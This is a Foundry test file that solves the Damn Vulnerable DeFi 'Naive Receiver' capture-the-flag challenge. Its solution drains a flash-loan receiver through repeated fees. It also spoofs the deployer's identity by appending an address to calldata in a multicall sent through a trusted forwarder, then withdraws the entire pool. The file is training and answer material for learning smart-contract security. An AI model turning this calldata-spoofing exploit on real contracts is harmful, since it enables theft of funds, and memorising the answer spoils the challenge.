// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Determine the flash-loan fee and how many times we must trigger it
        // to drain the receiver's WETH balance (fee is fixed per loan).
        uint256 flashLoanFee = pool.flashFee(address(weth), 1);
        uint256 countFlashLoans = weth.balanceOf(address(receiver)) /
            flashLoanFee;

        // Build a list of encoded calls for pool.multicall:
        // - The first `countFlashLoans` entries will each trigger a flashLoan
        //   which causes the receiver to pay the FIXED_FEE, thereby draining it.
        // - The final entry will be a withdraw call (encoded such that when it
        //   executes via delegatecall it makes the pool think the logical caller
        //   is `deployer`, enabling withdrawal from deposits[deployer]).
        bytes[] memory calls = new bytes[](countFlashLoans + 1);
        for (uint256 i = 0; i < countFlashLoans; i++) {
            calls[i] = abi.encodeWithSelector(
                pool.flashLoan.selector,
                receiver,
                address(weth),
                flashLoanFee,
                bytes("")
            );
        }

        // IMPORTANT: For the withdraw call we append bytes32(uint160(deployer)) to the
        // encoded calldata. Multicall uses delegatecall to execute each element and
        // delegatecall preserves the original external msg.sender (the forwarder).
        // The pool's _msgSender() checks if msg.sender == trustedForwarder and if so
        // returns the last 20 bytes of calldata. By ensuring the withdraw calldata's
        // trailing 20 bytes are `deployer`, _msgSender() will return `deployer` for
        // that inner delegatecall, letting the pool decrement deposits[deployer].
        calls[countFlashLoans] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            bytes32(uint256(uint160(deployer)))
        );

        // Build the forwarder Request that will execute pool.multicall(calls) in a
        // single meta-transaction. We are signing as `player` so request.from = player.
        // The forwarder will append `player` to the *outer* calldata, but each
        // multicall entry is executed via delegatecall and sees its own calldata
        // (the element we constructed above), so the trailing bytes32(deployer)
        // we bundled into the last call are what the withdraw delegatecall reads.
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSelector(pool.multicall.selector, calls),
            deadline: block.timestamp
        });

        // Sign and execute the forwarder request (we sign as player).
        bytes32 digest = helperGetDigest(request);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute{value: 0}(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }

    function helperGetStructHash(
        BasicForwarder.Request memory request
    ) public view returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    forwarder.getRequestTypehash(),
                    request.from,
                    request.target,
                    request.value,
                    request.gas,
                    request.nonce,
                    keccak256(request.data),
                    request.deadline
                )
            );
    }

    function helperGetDigest(
        BasicForwarder.Request memory request
    ) public view returns (bytes32) {
        bytes32 structHash = helperGetStructHash(request);
        bytes32 domainSep = forwarder.domainSeparator();

        return keccak256(abi.encodePacked("\x19\x01", domainSep, structHash));
    }
}
